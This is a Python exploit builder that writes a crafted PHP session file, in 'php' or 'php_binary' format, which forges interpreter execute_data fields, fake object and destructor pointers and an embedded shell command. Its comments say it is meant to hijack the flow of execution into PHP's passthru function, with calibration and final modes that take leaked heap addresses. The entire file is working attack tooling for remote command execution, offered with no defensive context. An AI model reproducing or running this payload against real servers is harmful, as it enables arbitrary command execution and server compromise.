#!/usr/bin/env python3
"""Build a `php` (key|serialized) session file for the entry-1 zif_passthru test.

Format differences vs the php_binary builder:
  php:        rec1 = key(96) + '|' + serialized_value
  php_binary: rec1 = len_byte(96) + key(96) + serialized_value
  php:        rec2 = 'z' + '|' + s:<L>:"<payload>"
  php_binary: rec2 = '\\x01z' + s:<L>:"<payload>"

The fake execute_data fields must land on the raw session-buffer bytes at
0x2c/0x50/0x58.  In `php` the key starts at raw offset 0, so the field indices
are the raw offsets; in `php_binary` the key starts at raw offset 1.
"""
import argparse, json, os, struct

L1 = 96
F_PAYLOAD_OFF = 0x100
CMD_LEN_OFF = F_PAYLOAD_OFF + 0x10
CMD_OFF = F_PAYLOAD_OFF + 0x18


def build(path, X1, P, B0, total, mode, fmt, x2=0, cmd=b'', target=0, a_target=0, dtor=0, verbose=True):
    val = ('i:%d;' % target).encode()
    koff = (lambda raw: raw) if fmt == 'php' else (lambda raw: raw - 1)
    key1 = bytearray(b'A' * L1)
    key1[koff(0x2c):koff(0x2c) + 4] = struct.pack('<I', 1)          # EX_NUM_ARGS = 1
    key1[koff(0x50):koff(0x50) + 8] = b'\x00' * 8                    # arg1 ptr set after Q
    key1[koff(0x58)] = 6                                             # arg1 IS_STRING
    if fmt == 'php':
        rec1 = bytes(key1) + b'|' + val
    else:
        rec1 = bytes([L1]) + bytes(key1) + val
    R = len(rec1)
    L = total - R - 2
    for _ in range(8):
        if fmt == 'php':
            prefix2 = b'z|' + b's:' + str(L).encode() + b':"'
        else:
            prefix2 = b'\x01z' + b's:' + str(L).encode() + b':"'
        nl = total - R - len(prefix2) - 2
        if nl == L:
            break
        L = nl
    if fmt == 'php':
        prefix2 = b'z|' + b's:' + str(L).encode() + b':"'
    else:
        prefix2 = b'\x01z' + b's:' + str(L).encode() + b':"'
    Q = R + len(prefix2)
    if x2:
        key1[koff(0x50):koff(0x50) + 8] = struct.pack('<Q', x2 + 0x18 + Q + F_PAYLOAD_OFF)
        if fmt == 'php':
            rec1 = bytes(key1) + b'|' + val
        else:
            rec1 = bytes([L1]) + bytes(key1) + val
        assert len(rec1) == R
    payload = bytearray(L)
    p_off = P - (X1 + 24)
    b_off = B0 - (X1 + 24)
    p_idx = p_off - Q
    b_idx = b_off - Q
    dtor = dtor or B0
    d_off = dtor - (X1 + 24)
    d_idx = d_off - Q
    assert 0 <= p_idx and p_idx + 72 <= L, 'fake P outside payload'
    assert 0 <= b_idx and b_idx + 16 <= L, 'real B0 outside payload'
    assert 0 <= d_idx and d_idx + 16 <= L, 'fake dtor outside payload'
    K = 0 if mode == 'calib' else (a_target - (dtor + 16)) // 16
    if mode != 'calib':
        assert (a_target - (dtor + 16)) % 16 == 0, (hex(a_target), hex(dtor))
    f = struct.pack('<QQQQQQQQ', P + 56, dtor, dtor, 0, 0, 0, 0x7fffffff, 1018)
    payload[p_idx:p_idx + len(f)] = f
    payload[p_idx + 64:p_idx + 72] = struct.pack('<Q', 0)
    payload[d_idx:d_idx + 8] = struct.pack('<q', K)
    payload[d_idx + 8:d_idx + 16] = struct.pack('<Q', 0)
    payload[CMD_LEN_OFF:CMD_LEN_OFF + 8] = struct.pack('<Q', len(cmd))
    payload[CMD_OFF:CMD_OFF + len(cmd)] = cmd
    payload[CMD_OFF + len(cmd)] = 0
    assert CMD_OFF + len(cmd) + 1 < L
    data = rec1 + prefix2 + bytes(payload) + b'";'
    assert len(data) == total, (len(data), total)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, 'wb') as fp:
        fp.write(data)
    meta = {'path': path, 'format': fmt, 'mode': mode, 'total': total, 'rec1_len': R, 'L': L,
            'payload_start': Q, 'X1': hex(X1), 'X2': hex(x2) if x2 else None,
            'P': hex(P), 'B0': hex(B0), 'dtor': hex(dtor), 'p_off': p_off, 'b_off': b_off,
            'p_idx': p_idx, 'b_idx': b_idx, 'd_idx': d_idx, 'K': K,
            'A_target': hex(a_target), 'value': val.decode(),
            'F': hex(x2 + 0x18 + Q + F_PAYLOAD_OFF) if x2 else None,
            'F_off': Q + F_PAYLOAD_OFF, 'cmd_len_off': Q + CMD_LEN_OFF,
            'cmd_off': Q + CMD_OFF, 'cmd': cmd.decode('latin1')}
    if verbose:
        print(json.dumps(meta, indent=1))
    return meta


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--out', required=True)
    ap.add_argument('--x1', type=lambda s: int(s, 0), required=True)
    ap.add_argument('--x2', type=lambda s: int(s, 0), default=0)
    ap.add_argument('--p', type=lambda s: int(s, 0), required=True)
    ap.add_argument('--b0', type=lambda s: int(s, 0), required=True)
    ap.add_argument('--dtor', type=lambda s: int(s, 0), default=0)
    ap.add_argument('--total', type=int, default=131014)
    ap.add_argument('--mode', choices=['calib', 'final'], default='calib')
    ap.add_argument('--format', dest='fmt', choices=['php', 'php_binary'], default='php')
    ap.add_argument('--cmd', required=True)
    ap.add_argument('--target', type=lambda s: int(s, 0), required=True)
    ap.add_argument('--a-target', type=lambda s: int(s, 0), required=True)
    ap.add_argument('--meta', default=None)
    a = ap.parse_args()
    if a.mode == 'final':
        assert a.x2, 'final mode needs --x2'
    meta = build(a.out, a.x1, a.p, a.b0, a.total, a.mode, a.fmt, a.x2,
                 a.cmd.encode(), a.target, a.a_target, a.dtor, verbose=True)
    if a.meta:
        with open(a.meta, 'w') as fp:
            json.dump(meta, fp, indent=1)


if __name__ == '__main__':
    main()
